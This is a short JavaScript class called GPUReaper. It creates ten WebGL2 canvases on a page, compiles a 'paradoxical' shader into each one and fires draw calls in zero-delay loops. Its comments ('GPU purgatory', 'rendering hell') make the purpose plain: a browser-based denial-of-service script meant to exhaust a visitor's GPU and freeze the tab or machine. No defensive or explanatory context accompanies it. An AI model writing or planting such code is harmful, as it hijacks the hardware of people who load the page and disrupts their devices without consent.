class GPUReaper {
    constructor() {
        this.canvases = [];
        this.initGPUPurgatory();
    }

    initGPUPurgatory() {
        // Create 10 WebGL2 contexts
        for(let i=0; i<10; i++) {
            const canvas = document.createElement('canvas');
            document.body.appendChild(canvas);
            this.canvases.push(canvas.getContext('webgl2'));
        }

        // Load paradoxical shader
        const shader = `#version 300 es
        ${document.getElementById('paradox-shader').textContent}
        `;

        // Initialize all contexts
        this.canvases.forEach(gl => {
            const program = gl.createProgram();
            const shaderObj = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(shaderObj, shader);
            gl.compileShader(shaderObj);
            gl.attachShader(program, shaderObj);
            gl.linkProgram(program);
            gl.useProgram(program);
            
            // Start rendering hell
            setInterval(() => {
                gl.drawArrays(gl.TRIANGLES, 0, 3);
                gl.flush();
            }, 0);
        });
    }
}
